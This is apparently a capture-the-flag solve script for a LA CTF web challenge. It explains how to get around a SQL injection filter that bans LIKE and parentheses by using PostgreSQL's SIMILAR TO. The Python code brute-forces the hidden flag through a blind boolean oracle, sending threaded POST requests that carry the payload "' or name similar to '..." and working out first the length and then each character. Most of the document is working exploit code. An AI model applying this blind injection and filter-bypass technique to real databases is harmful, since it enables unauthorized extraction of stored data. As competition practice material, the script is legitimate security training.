"""
Looking at the app, it allows a sqli using any printable character except for ()%.
It also prevents us from using the word `like` in any case.
Our task is to exfiltrate the value of the `name` column for the flag entry.

The classic way to do this is to inject something along lines of
name LIKE 'prefix%' (which matches against all entries
                     starting with prefix as % is a wildcard)

However, LIKE is banned, so we must find something else.
() is banned so we cannot resort to using clever sql functions.

We notice that our database is postgresql which has special pattern matching
not found in other sql dbs: the SIMILAR TO keyword which behaves like LIKE
(see https://www.postgresql.org/docs/current/functions-matching.html)

Now that we have a pattern matching, we are ready to build our prefix
and get the flag!

We have to first get the length of the flag by brute forcing the amount of _
as none of the full wildcard options are available.

After that, we exfiltrate the flag.
"""

from concurrent.futures import ThreadPoolExecutor
import requests
import string

# get the allowed chars with _ at end as _ matches all chars
allowed_chars = string.ascii_letters + string.digits + "{}_"

# change url depending on api deployment
url = "http://127.0.0.1:8080/submit"
url = "https://penguin.chall.lac.tf/submit"
oracle = lambda flag: requests.post(url, data={"username": "' or name similar to '" + "".join(flag)}).status_code == 200


with ThreadPoolExecutor(len(allowed_chars)) as pool:
    # step 1: get the length of the flag
    # we start at 10 as there are other entries in the database below len 10
    len_queries = ["_" * i for i in range(10, 100)]
    flag = len_queries[[*pool.map(oracle, len_queries)].index(True)]

    # step 2: brute each char using `similar to`
    print("Brute forcing flag")
    for i in range(len(flag)):
        options = [flag[:i] + c + flag[i + 1:] for c in allowed_chars]
        flag = options[[*pool.map(oracle, options)].index(True)]
        print(flag)

    # we do seem to notice that the flag outputted is not correct
    # this is in fact because we get an error when the first char is a number after {
    # db-1    | 2024-01-01 09:51:29.576 UTC [33] ERROR:  invalid regular expression: invalid repetition count(s)
    # db-1    | 2024-01-01 09:51:29.576 UTC [33] STATEMENT:  SELECT * FROM penguins WHERE name = '' or name similar to 'lactf{1______________________________________'

    # we will now have to guess that letter
    options = [flag[:6] + d + flag[7:] for d in string.digits]
    eqoracle = lambda flag: requests.post(url, data={"username": "".join(flag)}).status_code == 200
    flag = options[[*pool.map(eqoracle, options)].index(True)]


print("Flag", flag)
